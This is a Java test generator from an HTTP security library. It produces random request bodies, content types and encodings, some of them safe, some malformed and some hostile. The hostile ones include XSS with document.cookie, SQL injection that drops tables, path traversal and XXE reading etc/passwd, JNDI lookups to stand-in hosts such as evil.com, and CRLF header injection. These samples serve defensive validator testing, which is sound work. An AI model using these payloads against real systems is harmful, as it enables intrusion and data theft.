/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.generators;

import de.cuioss.test.generator.Generators;
import de.cuioss.test.generator.TypedGenerator;
import de.cuioss.tools.security.http.data.HTTPBody;

/**
 * Generates HTTPBody records for testing purposes.
 * 
 * IMPROVED: Uses dynamic generation instead of hardcoded arrays for better randomness
 * and unpredictability while maintaining attack effectiveness.
 * 
 * Implements: Task G9 from HTTP verification specification
 */
public class HTTPBodyGenerator implements TypedGenerator<HTTPBody> {

    // Core generation parameters
    private final TypedGenerator<Integer> contentTypeGenerator = Generators.integers(0, 3);
    private final TypedGenerator<String> userNames = Generators.fixedValues("john", "admin", "user", "test");
    private final TypedGenerator<String> roles = Generators.fixedValues("admin", "user", "guest", "manager");
    private final TypedGenerator<String> scriptNames = Generators.fixedValues("alert", "confirm", "prompt");
    private final TypedGenerator<String> xssPayloads = Generators.fixedValues("XSS", "1", "document.cookie");
    private final TypedGenerator<String> sqlCommands = Generators.fixedValues("DROP TABLE", "DELETE FROM", "INSERT INTO");
    private final TypedGenerator<String> tableNames = Generators.fixedValues("users", "admin", "accounts", "sessions");
    private final TypedGenerator<String> systemFiles = Generators.fixedValues("etc/passwd", "windows/win.ini", "boot.ini", "etc/shadow");
    private final TypedGenerator<String> jndiHosts = Generators.fixedValues("evil.com", "attacker.net", "malicious.org");
    private final TypedGenerator<String> dataTypes = Generators.fixedValues("user", "product", "order", "session");
    private final TypedGenerator<Integer> depthGen = Generators.integers(1, 5);
    private final TypedGenerator<Integer> payloadSize = Generators.integers(100, 500);
    private final TypedGenerator<String> encodingTypes = Generators.fixedValues("gzip", "deflate", "br", "compress");
    private final TypedGenerator<Boolean> contextSelector = Generators.booleans();

    @Override
    public HTTPBody next() {
        int type = contentTypeGenerator.next();

        String content = switch (type) {
            case 0 -> generateSafeContent();
            case 1 -> generateAttackContent();
            case 2 -> generateMalformedContent();
            default -> generateSafeContent();
        };

        String contentType = generateContentType();
        String encoding = generateEncoding();

        return new HTTPBody(content, contentType, encoding);
    }

    private String generateSafeContent() {
        int contentType = Generators.integers(0, 6).next();
        return switch (contentType) {
            case 0 -> generateJsonContent();
            case 1 -> generateFormData();
            case 2 -> generateXmlContent();
            case 3 -> generatePlainText();
            case 4 -> generateFileContent();
            case 5 -> generateTokenContent();
            case 6 -> generateStatusContent();
            default -> generatePlainText();
        };
    }

    private String generateJsonContent() {
        String user = userNames.next();
        String role = roles.next();
        return "{\"user\":\"" + user + "\",\"role\":\"" + role + "\"}";
    }

    private String generateFormData() {
        String user = userNames.next();
        String pass = "secret" + Generators.integers(100, 999).next();
        return "username=" + user + "&password=" + pass;
    }

    private String generateXmlContent() {
        String user = userNames.next();
        String role = roles.next();
        return "<user><name>" + user + "</name><role>" + role + "</role></user>";
    }

    private String generatePlainText() {
        String[] templates = {
                "Hello World",
                "file content here",
                "search query: java programming",
                "comment: This is a test comment",
                "description: Product information",
                "message: Welcome to our application"
        };
        return templates[Generators.integers(0, templates.length - 1).next()];
    }

    private String generateFileContent() {
        String dataType = dataTypes.next();
        int id = Generators.integers(1000, 9999).next();
        return "data: " + id + ", type: " + dataType;
    }

    private String generateTokenContent() {
        String prefix = Generators.fixedValues("token", "id", "key").next();
        String value = Generators.letterStrings(8, 16).next().toLowerCase();
        return prefix + ": " + value;
    }

    private String generateStatusContent() {
        String status = Generators.fixedValues("active", "inactive", "pending", "completed").next();
        String version = Generators.integers(1, 5).next() + "." + Generators.integers(0, 9).next();
        return "status: " + status + ", version: " + version;
    }

    private String generateAttackContent() {
        int attackType = Generators.integers(0, 8).next();
        return switch (attackType) {
            case 0 -> generateXSSAttack();
            case 1 -> generateSQLInjection();
            case 2 -> generatePathTraversal();
            case 3 -> generateJNDIAttack();
            case 4 -> generateControlCharAttack();
            case 5 -> generateResponseSplitting();
            case 6 -> generateXXEAttack();
            case 7 -> generateUnicodeAttack();
            case 8 -> generateLargePayload();
            default -> generateXSSAttack();
        };
    }

    private String generateXSSAttack() {
        String scriptName = scriptNames.next();
        String payload = xssPayloads.next();
        return "<script>" + scriptName + "('" + payload + "')</script>";
    }

    private String generateSQLInjection() {
        String command = sqlCommands.next();
        String table = tableNames.next();
        return "'; " + command + " " + table + "; --";
    }

    private String generatePathTraversal() {
        int depth = depthGen.next();
        StringBuilder path = new StringBuilder();
        for (int i = 0; i < depth; i++) {
            path.append("../");
        }
        path.append(systemFiles.next());
        return path.toString();
    }

    private String generateJNDIAttack() {
        String host = jndiHosts.next();
        String exploit = Generators.fixedValues("exploit", "payload", "attack").next();
        return "${jndi:ldap://" + host + "/" + exploit + "}";
    }

    private String generateControlCharAttack() {
        int numChars = Generators.integers(3, 6).next();
        StringBuilder chars = new StringBuilder();
        for (int i = 0; i < numChars; i++) {
            int charCode = Generators.integers(0, 31).next();
            chars.append("\\u").append("%04x".formatted(charCode));
        }
        return chars.toString();
    }

    private String generateResponseSplitting() {
        String status = Generators.fixedValues("200 OK", "404 Not Found", "500 Error").next();
        return "%0d%0a%0d%0aHTTP/1.1 " + status + "%0d%0a";
    }

    private String generateXXEAttack() {
        String systemFile = systemFiles.next();
        String entityName = Generators.fixedValues("xxe", "exploit", "file").next();
        return "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY " + entityName + " SYSTEM \"file:///" + systemFile + "\">]><foo>&" + entityName + ";</foo>";
    }

    private String generateUnicodeAttack() {
        String scriptName = scriptNames.next();
        return "\\u202e\\u202d" + scriptName + ":alert(1)";
    }

    private String generateLargePayload() {
        int size = payloadSize.next();
        return Generators.letterStrings(size, size + 100).next();
    }

    private String generateMalformedContent() {
        int malformType = Generators.integers(0, 7).next();
        return switch (malformType) {
            case 0 -> ""; // Empty content
            case 1 -> "   "; // Whitespace only
            case 2 -> generateBinaryData();
            case 3 -> generateMalformedJson();
            case 4 -> generateMalformedXml();
            case 5 -> generateEmptyFormData();
            case 6 -> generateHeaderInjection();
            case 7 -> generateZeroWidthChars();
            default -> "";
        };
    }

    private String generateBinaryData() {
        int numBytes = Generators.integers(3, 8).next();
        StringBuilder binary = new StringBuilder();
        for (int i = 0; i < numBytes; i++) {
            int byteVal = Generators.integers(0, 255).next();
            binary.append("\\u").append("%04x".formatted(byteVal));
        }
        return binary.toString();
    }

    private String generateMalformedJson() {
        String key = dataTypes.next();
        String value = Generators.fixedValues("json", "data", "value").next();
        return "{\"" + key + "\": " + value + ",}"; // Extra comma
    }

    private String generateMalformedXml() {
        String tagName = dataTypes.next();
        return "<" + tagName + "><tag>"; // Unclosed tags
    }

    private String generateEmptyFormData() {
        String[] fields = {"username", "password", "email", "submit"};
        StringBuilder form = new StringBuilder();
        for (int i = 0; i < fields.length; i++) {
            if (i > 0) form.append("&");
            form.append(fields[i]).append("=");
        }
        return form.toString();
    }

    private String generateHeaderInjection() {
        String header = Generators.fixedValues("Content-Type", "X-Forwarded-For", "User-Agent").next();
        return header + ": text/html\\r\\n\\r\\n<html>";
    }

    private String generateZeroWidthChars() {
        String[] zeroWidth = {"\\u200B", "\\u200C", "\\u200D", "\\u2060"};
        StringBuilder chars = new StringBuilder();
        for (int i = 0; i < Generators.integers(2, 6).next(); i++) {
            chars.append(zeroWidth[Generators.integers(0, zeroWidth.length - 1).next()]);
        }
        return chars.toString();
    }

    private String generateContentType() {
        int contentTypeType = Generators.integers(0, 3).next();
        return switch (contentTypeType) {
            case 0 -> generateStandardContentType();
            case 1 -> generateAttackContentType();
            case 2 -> generateMalformedContentType();
            default -> generateStandardContentType();
        };
    }

    private String generateStandardContentType() {
        String[] standard = {
                "application/json", "application/x-www-form-urlencoded", "text/plain",
                "text/html", "text/xml", "application/xml", "multipart/form-data",
                "application/octet-stream", "image/png", "image/jpeg"
        };
        String base = standard[Generators.integers(0, standard.length - 1).next()];
        if (contextSelector.next()) {
            base += "; charset=utf-8";
        }
        return base;
    }

    private String generateAttackContentType() {
        String attack = Generators.fixedValues("script", "header", "passwd").next();
        return "text/html; charset=<" + attack + ">alert(1)</" + attack + ">";
    }

    private String generateMalformedContentType() {
        int malformType = Generators.integers(0, 4).next();
        return switch (malformType) {
            case 0 -> "";
            case 1 -> "   ";
            case 2 -> "../../../etc/passwd";
            case 3 -> "application\\u0000/json";
            case 4 -> "invalid/content/type/with/slashes";
            default -> "";
        };
    }

    private String generateEncoding() {
        int encodingType = Generators.integers(0, 3).next();
        return switch (encodingType) {
            case 0 -> ""; // No encoding
            case 1 -> generateStandardEncoding();
            case 2 -> generateAttackEncoding();
            case 3 -> generateMalformedEncoding();
            default -> "";
        };
    }

    private String generateStandardEncoding() {
        String encoding = encodingTypes.next();
        if (contextSelector.next()) {
            String second = encodingTypes.next();
            return encoding + ", " + second;
        }
        return encoding;
    }

    private String generateAttackEncoding() {
        String attack = Generators.fixedValues("script", "header", "passwd").next();
        return "gzip\\r\\nX-Injected: " + attack;
    }

    private String generateMalformedEncoding() {
        int malformType = Generators.integers(0, 3).next();
        return switch (malformType) {
            case 0 -> "   ";
            case 1 -> "../../../etc/passwd";
            case 2 -> "gzip\\u0000deflate";
            case 3 -> Generators.letterStrings(50, 200).next();
            default -> "   ";
        };
    }

    @Override
    public Class<HTTPBody> getType() {
        return HTTPBody.class;
    }
}